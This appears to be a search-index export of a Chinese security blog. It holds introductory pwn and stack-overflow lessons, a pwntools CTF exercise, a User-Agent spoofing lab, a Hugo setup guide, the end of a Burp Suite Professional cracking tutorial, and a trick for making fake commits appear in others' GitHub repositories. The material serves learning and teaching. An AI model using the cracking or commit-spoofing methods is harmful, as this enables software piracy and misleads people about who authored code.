response后激活失败请使用快捷键粘贴，然后检查首尾是否有多余的空格或换行\nRef 部分图片来自https://github.com/hanshaze/burp\n","date":"2022-02-08T07:42:01-05:00","image":"https://blog.nanosec.site/p/burp-suite-professional-%E5%AE%89%E8%A3%85-%E7%A0%B4%E8%A7%A3%E6%95%99%E7%A8%8B/cover_hua2066985386d1eb65cef6aee0e5704d3_126782_120x120_fill_q75_box_smart1.jpg","permalink":"https://blog.nanosec.site/p/burp-suite-professional-%E5%AE%89%E8%A3%85-%E7%A0%B4%E8%A7%A3%E6%95%99%E7%A8%8B/","title":"Burp Suite Professional 安装+破解教程"},{"content":"PWN! PWN! PANG! Part3 这是一篇黑暗童话故事 确信)\n至于简介嘛= =，好奇的话就把文章看完吧qaq\nC语言函数调用栈 了解函数调用栈 函数调用栈是指程序运行时内存一段连续的区域\n用来保存函数运行时的状态信息，包括函数参数与局部变量等\n称之为“栈”是因为发生函数调用时，调用函数(caller)的状态被保存在栈内，被调用函数(callee)的状态被压入调用栈的栈顶\n在函数调用结束时，栈顶的函数(callee)状态被弹出，栈顶恢复到调用函数(caller)的状态\n函数调用栈在内存中从高地址向低地址生长，所以栈顶对应的内存地址在压栈时变小，退栈时变大\n关于栈帧 咳咳，上面很官方的解释是不是不容易理解.qwq.\n实际上上面所说的\u0026quot;函数的状态\u0026quot;在栈中是由一个一个栈帧(Stack Frame)表示的，基本上 (特殊情况的话，可能是某些在main函数前调用的函数) 每一个函数调用时在栈中都有自己的栈帧\n在这里，我们需要了解一下几点\n三个指针(寄存器)：\nebp指向当前栈帧底部(保存当前栈帧底部地址)\n至于为什么在上面，是因为栈从高地址向低地址增长\nesp指向栈顶(保存栈顶地址)\neip指向要执行的下一指令(保存下一条指令地址)\n参数(arguments)是保存在父函数栈帧中的(类似于父亲给儿子的\u0026quot;启动资金\u0026quot;)\n注意， 参数是逆序压栈滴\n返回地址(Return Address)保存了调用子函数前eip值，这个值在我们栈溢出攻击中至关重要，控制这个值之后就可以劫持程序执行流，让程序下一步执行你想要的指令\n(Caller's ebp / Previous ebp保存这父函数ebp的值，长度为一个字长(x32系统4Byte, x64系统8Byte)\n局部变量(Local Variables)一般是发生栈溢出攻击的地方，主要是因为程序在局部变量中读入了超长的数据，造成溢出覆盖了其他内容(比如说返回地址)\n函数调用栈整个过程 这一部分前面的知识点已经概括了一些了，再详细将下来篇幅过长，大家可以参考PPT\n栈溢出攻击:子函数\u0026quot;找不着家\u0026quot;了 咳咳，为了便于理解，这里我们生动形象一些\n前提 有时候程序猿不知道 \u0026ldquo;不要相信用户输入的数据总是安全的\u0026rdquo; 的道理，就在读入函数局部变量的过程中用了gets()等不限制数据长度的函数，或者写了其他可以导致读入过长数据的BUG代码\n攻击 如果我们在局部变量中写入的过长的数据，就会覆盖高地址处的 (数据从地址向高地址读入嘛)的数据，例如 prev ebp或者是ret addr(主要关注)\n如果我们写入的是垃圾数据，程序会返回到一个奇怪的地址，自然会崩溃(Crash)\n而如果我们写入精心构造的恶意数据，我们就可以劫持程序，让它干我们想要的事情;)\n比如说，调用system(\u0026quot;/bin/sh\u0026quot;)\n这里举个栗子\n如果我们把父函数比喻成爸爸的话，那么子函数就是儿子\n儿子要自己去闯荡了，\n父亲给儿子一些财产让儿子能更好的为未来做准备(父函数栈帧中参数 args)，\n然后父亲告诫自己的儿子一定要好好奋斗，回来后为家乡搞建设(返回地址ret addr)，\n后来，儿子有了自己的生活，财产(局部变量local var)\n但是呢，有攻击者这样一个角色。\n咳咳，他利用各种手段(我们实战的时候可以用pwndbg和pwntools等工具进行攻击)诱骗儿子，最终让他晕头转向，失去理智， 连自己家在哪里都找不到了;) (栈溢出用恶意数据覆盖返回地址)\n后来。。由于儿子以为攻击者给他的地址就是自己家的地址，就乖乖的跟着攻击者行事，帮助攻击者达成控制世界邪恶目的\n全剧终 逃)\n下一次开始实战哦.qaq.\nTo Be Continued\u0026hellip;\n","date":"2022-02-07T07:51:10-05:00","image":"https://blog.nanosec.site/p/pwn-pwn-pang-part3---%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/cover_huc93e8e51211b13db7df27f880625afbe_1479136_120x120_fill_q75_box_smart1.jpg","permalink":"https://blog.nanosec.site/p/pwn-pwn-pang-part3---%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/","title":"PWN! PWN! PANG! Part3 --- 栈溢出基础"},{"content":"PWN! PWN! PANG! Part2 前言 说完了前面那些基础 (貌似一点也不基础) 知识，今天再来谈谈工具\n由于我们研究的是Linux下的PWN,接下来的操作请在Linux下进行\n只有Windows怎么办？\n方案一：使用VMware Workstation Pro安装Linux虚拟机(我目前的方案) 小Tip:某些Linux发行版(例如Kali)可以在官网找到现成的虚拟机文件下载，如果你没有安装过虚拟机 (或懒得安装) ，可以试试这种方式\n方案二：使用WSL2(怎么说呢，WSL2虽说占空间小，而且有了GUI,但配置其实挺麻烦) PWNDBG pwndbg是Linux GDB的一个专门为PWN设计的一个插件, 能有助于我们调戏调试程序\n安装 一般Linux都会预装gdb吧= =，不过还是扯一下安装方法好了\nDeb 系\nsudo apt install gdb yum系 快去用Debian 逃)\nsudo yum -y install centos-release-scl sudo yum-config-manager --enable rhel-server-rhscl-7-rpms sudo yum -y install devtoolset-7 scl enable devtoolset-7 bash 安装pwndbg\ngit clone https://github.com/pwndbg/pwndbg.git cd pwndbg ./setup.sh 安装踩坑记 注意:pwndbg这个目录请不要删除或随意移动位置,否则可能会导致pwndbg无法正常启动\n如果安装后或系统更新后无法正常启动的话，请检查路径问题\nsudo vi ~/.gdbinit 输入命令后应该能看到一行\nsource 其他内容/pwndbg/gdbinit.py 记得把source之后的内容改成你pwndbg文件夹里gdbinit.py的路径\nTip:如果你想不用pwndbg的话，去掉这一行即可\n用法 大部分用法都和gdb的差不多，这里列举几个经常用的\nb 函数名 #断点断在某个函数处 b *一个地址 #断点断在某个地址 r #运行 n #执行下一条指令或者跳过一个函数 s #进入函数 q #退出gdb 至于pwndbg的特殊功能嘛= =，可以通过指令pwndbg查看\nPWNTOOLS 这个呢，是python的一个用来pwn的第三方库\n安装 直接上命令\npip install pwntools 没有pip? 赶紧去装python3!!!(这个大部分Linux也应该预装了= = )\n使用 就和一般的python库一样用嘛= =\nfrom pwn import * 再说几个常用的命令吧.qaq(其他的用到再说)，当然你最好可以看看文档\nio = process(\u0026#34;./程序名\u0026#34;) #类似与用PWNTools“监听”本地一个程序，之后就用io这个变量来负责数据的收发 io.send(\u0026#34;内容\u0026#34;) #发送数据(结尾不自动加换行符) io.sendline(\u0026#34;内容\u0026#34;) #发送一行数据(结尾自动加上换行符) io.recv() io.recvline() #接收数据，和前面两个函数同理 # 注意，在之后PWN的过程中一定要根据目标程序的输入/输出函数来判断前四个指令的使用，这种细微的差别也可能导致无法getshell io.interactive() #切换至交互模式，我们可以尽情享用得到的Shell了 PWN?PWN! 一起来实战吧 实战目的: 熟悉pwntools的使用\n如果你没使用之前的集成环境, 请点这里下载题目\n大家可以自己先试试，大概应该能想到怎么做了吧XD\n我们先运行看看这个小程序是什么来头 逃)\nPS: 如果终端提示权限不够，请给程序加上可执行权限\nchmod +x tools\n输出\nPwntools is such an awesome python module, right? Tell you a secret (only smart baby can see it) : Maybe I will tell you again when you clever than ELSEpush ...... 程序说:Pwntools是一个很好用的python模块，要告诉我们一个聪明人才能看见的小秘密\n还挑衅是吧\n咳咳，那怎样才能看到所谓的小秘密呢qaq,直接运行肯定看不到()\n根据所学知识和程序输出，我们可以判断出应该通过pwntools查看\n$ python3 Python 3.9.9 (main, Jan 12 2022, 16:10:51) [GCC 11.2.0] on linux Type \u0026#34;help\u0026#34;, \u0026#34;copyright\u0026#34;, \u0026#34;credits\u0026#34; or \u0026#34;license\u0026#34; for more information. \u0026gt;\u0026gt;\u0026gt; from pwn import * \u0026gt;\u0026gt;\u0026gt; 既然程序没有输入，只有输出，那么只有使用recv()或recvline()函数了qaq\nEXP:\nfrom pwn import * io = process(\u0026#34;./tools\u0026#34;) io.recvline() io.recvline() io.recvline() 整个过程展示:\n$ python3 Python 3.9.9 (main, Jan 12 2022, 16:10:51) [GCC 11.2.0] on linux Type \u0026#34;help\u0026#34;, \u0026#34;copyright\u0026#34;, \u0026#34;credits\u0026#34; or \u0026#34;license\u0026#34; for more information. \u0026gt;\u0026gt;\u0026gt; from pwn import * \u0026gt;\u0026gt;\u0026gt; io = process(\u0026#34;./tools\u0026#34;) [x] Starting local process \u0026#39;./tools\u0026#39; [+] Starting local process \u0026#39;./tools\u0026#39;: pid 108320 \u0026gt;\u0026gt;\u0026gt; io.recvline() [*] Process \u0026#39;./tools\u0026#39; stopped with exit code 0 (pid 108320) b\u0026#39;Pwntools is such an awesome python module, right?\\n\u0026#39; \u0026gt;\u0026gt;\u0026gt; io.recvline() b\u0026#39;Tell you a secret (only smart baby can see it) :\\n\u0026#39; \u0026gt;\u0026gt;\u0026gt; io.recvline() b\u0026#39;ZmxhZ3tuMHRfZjRzdGVyX3Q2YW5feTB1fQo=\\rMaybe I will tell you again when you clever than ELSEpush ......\\n\u0026#39; \u0026gt;\u0026gt;\u0026gt; The END= = To Be Continued\u0026hellip;\n突然发现自己真的挖了个好大的坑= ((\n","date":"2022-01-29T21:35:29-05:00","image":"https://blog.nanosec.site/p/pwn-pwn-pang-part2---%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/cover_hu3d6209426f4a4882dd231c4242aff084_2839967_120x120_fill_q75_box_smart1.jpg","permalink":"https://blog.nanosec.site/p/pwn-pwn-pang-part2---%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/","title":"PWN! PWN! PANG! Part2 --- 工具的使用"},{"content":"用GitHub服务器免费搭建博客 安装环境(Linux) 安装Hugo yum系\nsudo yum install hugo -y Arch\nsudo pacman -S hugo deb系\nsudo apt install hugo 安装Git(系统已经预装的自行忽略) yum系\nsudo yum install git Arch\nsudo pacman -Syu git deb系\nsudo apt install git 安装环境(Windows) 安装Hugo https://gohugo.io/getting-started/installing/#less-technical-users\n安装Git winget install Git.Git 开始建站.UwU.! GitHub项目创建 注册/登录GitHub帐号 P.S. 因为众所周知的原因。。在某些地区GitHub无法访问= =\n解决方案: 魔法上网/换Gitee(要实名= =)\n创建一个名为你的Github用户名.github.io的项目\n放在那里备用\n本地网站搭建 注意：我本地环境是Kali Linux, 其他环境可能步骤略有不同= =\n终端/cmd/或者你用的其他东西也罢输入\nhugo new site 你想给网站起的名字 这个时候Hugo就给你生成了一个网站\n接下来该犯选择综合征了\n咳咳，接下来去https://themes.gohugo.io/ 找一个喜欢的主题\nP.S. 我的博客是主题Stack\n进入你本地hugo网站的themes目录\ncd 网站名/themes 然后把你的主题放进去.qaq.\ngit clone 你的主题的GitHub网址.git 等你的主题静静的躺在那里了之后 逃)，依据文档配置你的网站\nStack的文档 https://docs.stack.jimmycai.com/zh/\nStack 主题的简单配置 把你的网站名/themes/hugo-theme-stack/exampleSite/目录下的config.yaml复制到网站根目录(也就是你的网站名这个目录)\n删除网站根目录的config.toml\n然后打开网站根目录下的config.yaml进行填空\n几个Tip(踩过的坑):\n博主头像放在/themes/hugo-theme-stack/assets/img/下\n关于那个头像下的emoji,如果你不想加上，emoji那一行留空就好\nStack排坑 Edit:\n嘛。。。。自从我出了这篇文章之后，很多人都成为了StackStack人((\n既然这个主题这么受欢迎，那就详细来扯扯我配置的心得吧w\nQ1:文章不显示在首页怎么办 修改你网站根目录下的config.yaml\nparams: mainSections: - posts Q2:评论区如何配置 我这里选用的是Gitalk\ncomments: enabled: true #开启评论功能设置为true provider: gitalk #提供平台，我这里是gitalk,当然你也可以选择其他的 #注意:提供平台选哪个下面的就填哪块区域 gitaik配置:\ngitalk: owner: 你的GitHub用户名 admin: 你的GitHub用户名 repo: 你的GitHub仓库名 #(注意不是网址!!!!!!!) clientID: clientSecret: #ClientID和ClientSecret请不要随意告诉他人哦~ ClientID和ClientSecret获取方法:\n去GitHub开发者设置里新建一个OAuth App\n然后就填空啦:\nApplicaton Name:随便起个名字\nHomepage URL:你博客的url\nApplication description:描述，随便写\nAuthorization callback URL:你博客url\nEnable Device Flow 不勾选\n保存后就可以获得ClientID，在它的下面(Client Secret框里)点击Generate a new client secret\n然后记得保存好，因为Client Secret你只能看到一次\nQ3:关于自定义和美化 这个自定义的话，其实感觉没什么特殊的必要，往往就是加一些奇奇怪怪的东西上去，但还是扯两句\n与自定义相关的路径(如没有可以自己添加)\n网站根目录/layouts/partials/head/custom.html #插入所有页面头部的HTML 网站根目录/layouts/partials/footer/custom.html #插入所有页面底部的HTML 网站根目录/static/ #资源文件路径 e.g. js css ... 最后放一个我写的Stack博客美化的懒人方法\n本地网站试运行 在你的网站根目录下打开终端/cmd/或者你喜欢的命令行工具\n输入\nhugo server 然后就可以在本机浏览器输入http://127.0.0.1:1313/看到你的网站啦qaq\n写博客 关于Markdown 写博客前先熟悉一下MarkDown语法\n小Tip:可以用MarkText(一款开源markdown编辑工具)写Blog,会舒适很多\n(我就是用的这个工具写这篇文章的)\nMarkText下载链接\n关于目录结构 你的文章是在网站根目录/content/posts/下\n你的\u0026quot;分类\u0026quot;在网站根目录/content/categories下\n试着尝试一下吧qaq 首先我们要创建一个md文件\n在网站根目录打开终端/cmd/\u0026hellip;并输入\nhugo new posts/随便一个名字/index.md 然后打开index.md\n将预先生产好的内容更改成\n--- title: \u0026#34;文章标题\u0026#34; description: \u0026#34;简介\u0026#34; date: 2022-01-29T02:02:45-05:00 image: \u0026#34;你同目录下的封面图片名字(带后缀并且是相对路径)\u0026#34; categories: - 分类1 - 分类2 tags: - 标签1 - 标签2 --- 注意：不同主题的格式可能不一样，如你没有使用Stack主题，快去查看文档\n之后就可以书写文章内容了\nTip:你引用的图片放在同目录下\n发布网站上GitHub 呼，完成这一步后，你的网站就可以公大家浏览了\n注意：之后本地的环境不要丢，之后继续发布博客的时候还有用\n发布网站 在网站根目录打开终端/cmd/等等，并输入\nhugo --theme=主题文件夹名 进入public准备发布\ncd public 发布上GitHub\ngit init git add -A git commit -m \u0026#34;对这次发布的说明\u0026#34; git remote add origin https://github.com/你的Github用户名/你的Github用户名.github.io.git git push -u origin master 接下来输入你的用户名和你的GitHub个人访问Token(不是密码，帐号密码已经不支持了)\n申请Token方法\n去设置-\u0026gt;开发者设置\n申请一个Personal access tokens\n发布成功后 现在，这个网站就可以脱离本地环境供大家访问了\n链接: https://你的Github用户名.github.io/\nRef https://weepingdogel.github.io/posts/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99_%E4%B8%8B/\nhttps://docs.stack.jimmycai.com/zh/\n","date":"2022-01-29T02:02:45-05:00","image":"https://blog.nanosec.site/p/hugo%E6%97%A0%E9%9C%80%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/cover_hu8faceda538ccec36a41e941e68707cfc_3003908_120x120_fill_q75_box_smart1.jpg","permalink":"https://blog.nanosec.site/p/hugo%E6%97%A0%E9%9C%80%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/","title":"Hugo无需服务器搭建个人博客"},{"content":"Web安全\u0026mdash;-浏览器信息伪造 \u0026ldquo;诶。。。PGR酱你用的什么浏览器\u0026rdquo;\n— MimiKs-Sec-Browser.QwQ.\n\u0026ldquo;啊= =哪有这种浏览器\u0026rdquo;\n— 诶嘿嘿，我就有这样神奇的浏览器XD\n如何拥有神奇的浏览器;) 咳咳咳，进入正题\n要实现以上的效果，就要用到浏览器信息伪造技术\n浏览器信息伪造的实现 网站判断你的设备和浏览器信息主要是依据你发向网站的数据包\n所以我们通过修改数据包实现浏览器信息伪造awa\nBurp Suite抓包 想要修改数据包，我们必须先抓获它\n(刚从野外抓到一只野生数据包)\n抓包工具推荐Burp Suite Burp Suite的大概原理：\nburp类似于代理服务器，\u0026ldquo;拦\u0026quot;你的浏览器和服务器之间，能够发现，拦截过往的数据包\nUpdate: 本文章图片里用的是Burp Suite 社区免费版，如需要免费获取专业版，可以参考我的另一篇文章\n切到Proxy(代理)的标签页，打开burp内置浏览器，打开intercept(中断拦截)开关，就可以愉快地开始抓包了qaq\n以ip查询网站ip.chinaz.com为例\n抓到的数据包\nGET / HTTP/1.1 Host: ip.chinaz.com Cookie: qHistory=aHR0cDovL2lwLmNoaW5hei5jb21fSVAvSVB2Nuafpeivou+8jOacjeWKoeWZqOWcsOWdgOafpeivog==; cz_statistics_visitor=6e92e1cd-3bd8-6ec0-9e75-271a4c8dfe89; UM_distinctid=17e9ad54d9ea91-0de9b86d1a8b15-f791b31-e1000-17e9ad54d9faa3; Hm_lvt_ca96c3507ee04e182fb6d097cb2a1a4c=1643278444,1643280347,1643281459,1643430361; CNZZDATA5082706=cnzz_eid%3D1961137514-1643271376-%26ntime%3D1643422648; SECKEY_ABVK=d8C9ZBZRX6Qya0VNufaZozKriQgZkNE9wBJvCc1YVMo%3D; BMAP_SECKEY=ZvL10u-tISavTuXtRnLwuMF6SZ4DS3InrGol25-dIiWXTBfvmHf1rOql24bKE6-K7ExBo1yo-mlyN-y7jnL9aasP3q6E4R0onZG-ZZW_unKjL13-oBTm8QkEMlFdp3r8C7gTLnuhcWNYDIBVi6s_AOD-H2CjUVKCvfGq6TnZPfxkHkBk2xyM8n1R0E_onq6F Sec-Ch-Ua: \u0026#34;Chromium\u0026#34;;v=\u0026#34;97\u0026#34;, \u0026#34; Not;A Brand\u0026#34;;v=\u0026#34;99\u0026#34; Sec-Ch-Ua-Mobile: ?0 Sec-Ch-Ua-Platform: \u0026#34;Windows\u0026#34; Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: none Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Connection: close 数据包修改实现伪造浏览器信息 现在看向这一行数据\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 它包含了你的浏览器/网络信息\n所以我们只需对它进行修改并Forward(放行)\n小Tip:\nBurp抓到的包可以Forward(放行)\n也可以Drop(丢弃)\nUser-Agent: MimiKs-Sec_Browser.QwQ. 靶场实战 靶场地址: 浏览器信息伪造_网络安全_在线靶场_墨者学院_专注于网络安全人才培养\n首先分析一下这个网站\n好家伙，这网站叫我们用iPhone手机，并在2G环境下访问（\n(这不明显是欠揍嘛= =)\n很显然，这在正常情况下不大可能，现在的iPhone手机大多是4G/5G的\n那么我们就用\u0026quot;不正常\u0026quot;的方式去访问它\n注意:根据页面提示,抓包分析除了判断浏览器类型还判断了微信特有的NetType\n将User-Agent改为:\nMozilla/5.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12A365 MicroMessenger/6.0 NetType/2G 小Tip:可以上网查询相关设备User-Agent长什么样子\n成功获取flag\n(flag这里不放了，自己去可以去VAN)\nThe END ","date":"2022-01-28T22:53:47-05:00","image":"https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8--%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BF%A1%E6%81%AF%E4%BC%AA%E9%80%A0/cover_hu337d2e493e824d835754f79e3b77496e_3809477_120x120_fill_q75_box_smart1.jpg","permalink":"https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8--%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BF%A1%E6%81%AF%E4%BC%AA%E9%80%A0/","title":"Web安全--浏览器信息伪造"},{"content":"PWN! PWN! PANG! Part1 前言 这里是PGR的PWN基础学习笔记qaq，主要研究的是Linux下ELF可执行文件的漏洞利用\n涉及内容:\n栈(Stack)的漏洞利用，主要是栈溢出(Stack Overflow)攻击 PS: 说到Stack Overflow就必须得说一个同名的国外著名IT论坛(真的特别特别特别好用)\n重要的事情说三遍哈XD\nhttps://stackoverflow.com/\nC语言Printf()函数格式化字符串漏洞(Format String)\n一小点堆(Heap)利用\nAND: 文章中涉及的题目文件会全部随文章发出来\n如果各位不想一个一个下载的话，这边有一个环境搭好(工具+题目)的Xubuntu Linux(VMware虚拟机)\n链接如下:\nmimiksworkshop-my.sharepoint.com/:u:/g/personal/kirapgr_mimiksworkshop_onmicrosoft_com/Efyh9fLtgIZCi2Q21hCXLI0BFrHp17qc9ZxHW6mjovmSBw?e=BUtZzA\n如果想只下载题目的话:\nmimiksworkshop-my.sharepoint.com/:u:/g/personal/kirapgr_mimiksworkshop_onmicrosoft_com/Eefb6Yqp7vpGriwwFz6wQCkBtjqcFnGZwZTAyK2fJhA_FA?e=gjHVUW\n什么是PWN? PWN原指黑客攻破系统发出的“砰”的响声，在这里我们解释为二进制漏洞挖掘与利用\n分步来讲的话 = = 大概可以概括为以下几点：\n破解、利用成功（程序的二进制漏洞）\n攻破（设备、服务器）\n控制（设备、服务器）\nLinux下ELF文件 ELF文件的是Linux下的可执行文件，与Windows下exe文件不同\n可以用File命令查看你的文件格式:\n不过这里有一个很有趣的地方，由于File命令依据文件头判断文件类型，Linux的后缀名并不影响File命令判断文件是ELF文件(即使a.out已经变成了a.zip)\n不过在文件夹窗口里双击这个.zip, 就会发现:这个ELF文件已经被当成压缩包打开 (这和win似乎很像)\n可见在修改后缀名的过程中，干扰了系统对于文件打开方式的识别= =\nELF文件的结构 咳咳，貌似扯远了= =\n现在我们再重新审视一下\u0026quot;a.out\u0026quot;这个可执行文件\n我们刚刚一不小心把它用压缩包的方式打开(如上图)\n我们看到一堆奇怪的文件:\n.got\n.got.plt\n.plt\n.text\n\u0026hellip;\n这些文件实际上代表着这个ELF文件在磁盘里的 一个个 \u0026ldquo;节\u0026rdquo;(Section)\n而当ELF被映射进内存中的时候， 就有了段(Segment)\n段与节 在这里再详细扯一点段与节的东西\n(嘛 = =， 因为我个人学的时候感觉这块知识对于后面影响挺大的)\n先扯一下: 段是比节大的qaq\n这里来一个非常非常经典且重要的图,有请:\n从这张图我们可以看到，.data .bss .got.plt节都被映射到了Data(数据)段\n而.rodata .text .init ELF Header被映射到了Code(代码)段\n这是为什么呢?\n前三个节 (懒得仔细写了) 有一个共同的特征:可读可写。因为用户数据是要保存在这里的，如果它不可写的话，显然不彳亍= = 。 很显然，你也不能让它可执行，这样用户就可以写入任意数据并执行了(永远不要相信用户的输入是安全的)\n后四个节是代码部分，往往是小程序自己的一些东西，所以他是可读可执行，但不可以写= =\n最后, \u0026gt;__\u0026lt;, 再来个图;)\n程序数据在内存中的组织 废话不说，直接上图()\n咳咳，在这里默认大家有一点的c基础\n不再扯开讲了\n这里要注意的几点就是\n栈是向下从高地址向低地址增长的\n堆是从低地址向高地址增长\n数据是从低地址向高地址写入\nBSS保存全局变量\n栈保存局部变量\n关于汇编，罪恶的汇编= = 汇编的话，只需要知道最最最基础的一些指令= =\n既然都写了这么长了嘛= =\n那就继续下去好了。。咳咳。\n一些常用汇编指令\n用法\nMOV DEST(地址), SRC(值) ; 把源操作数传送给目标(类似赋值语句) LEA REG, SRC ; 把源操作数的有效地址送给指定的寄存器(把SRC的地址保存到…) PUSH VALUE ; 把目标值压栈，同时SP指针-1字长 POP DEST ; 将栈顶的值弹出至目的存储位置，同时SP指针+1字长 LEAVE ; 在函数返回时，恢复父函数栈帧的指令(子函数调用结束后，销毁子函数栈帧) RET ; 在函数返回时，控制程序执行流返回父函数的指令 结语 (啊，终于写完了， 好累)\n花了四五个小时才搞完= =\n不过嘛，能复习前面的知识并且能与大家分享.qaq.\n还是挺有趣的嘛= =\nTo Be Continued\u0026hellip;.\n","date":"2022-01-27T21:24:46-05:00","image":"https://blog.nanosec.site/p/pwn-pwn-pang-part1---%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/cover_hu576b02bd11baef12c82f0e62b58bf2a0_136072_120x120_fill_q75_box_smart1.jpg","permalink":"https://blog.nanosec.site/p/pwn-pwn-pang-part1---%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/","title":"PWN! PWN! PANG! Part1---基础知识"},{"content":"GitHub url修改逻辑漏洞 前言： 大家好，我是鸽子PGR, 这是我第一篇博客= =\n同时呢，这也意味着我接下来会放弃b站更新视频，主要是想要多花一些时间提升一下自己的技术，并通过写博客的形式做笔记，毕竟做视频真的很麻烦qaq\n(其实只是因为懒 别打)\n一. 漏洞演示 咳咳，言归正传 OwO\n最近刷GitHub的时候看到了这个\nLinus真的一反常态删除了Linux??\n很显然这是假的~\n或者说，这是一个硬核恶作剧= =\n而这个恶作剧利用了GitHub一个小小的逻辑漏洞\n二. 漏洞复现 如果你嘤文水平不戳的话，可以参考https://news.ycombinator.com/item?id=24976138\n想要利用这个漏洞，你只需要一个GitHub帐号和一个浏览器\n首先Fork某一个项目，然后在你fork的项目中随便改点东西(任意的东西都可以)\n至于Fork键的位置，自己找\n然后点进你新加上的commit\ncommit链接\nhttps://github.com/Kira-Pgr/MEMZ/commit/43ab3c1283605216e5b56388c11483fee7dcd47c\n把commit 改为tree\nhttps://github.com/Kira-Pgr/MEMZ/tree/43ab3c1283605216e5b56388c11483fee7dcd47c\n最后，把你的id(这里演示时是Kira-Pgr)改成你想要\u0026quot;修改\u0026quot;对方项目的人的id\n(这里的id是NyDubh3)\nhttps://github.com/NyDubh3/MEMZ/tree/43ab3c1283605216e5b56388c11483fee7dcd47c\n这样你修改的东西就看来像是在原项目里一样 qaq\n结语： 这个洞虽说危害不大，而且只需要判断commit是不是从一个fork来的就可以避免受到影响\n但还是很好VAN的 逃)\n(⁄ ⁄•⁄ω⁄•⁄ ⁄)\n","date":"2022-01-26T21:15:07-05:00","image":"https://blog.nanosec.site/p/github%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9Elinus%E5%A4%A7%E7%A5%9E%E6%80%92%E5%88%A0linux/cover_huc96b35635ae944d6d48a0fbbc753b249_133823_120x120_fill_q75_box_smart1.jpg","permalink":"https://blog.nanosec.site/p/github%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9Elinus%E5%A4%A7%E7%A5%9E%E6%80%92%E5%88%A0linux/","title":"GitHub逻辑漏洞:Linus大神'怒删'Linux"}]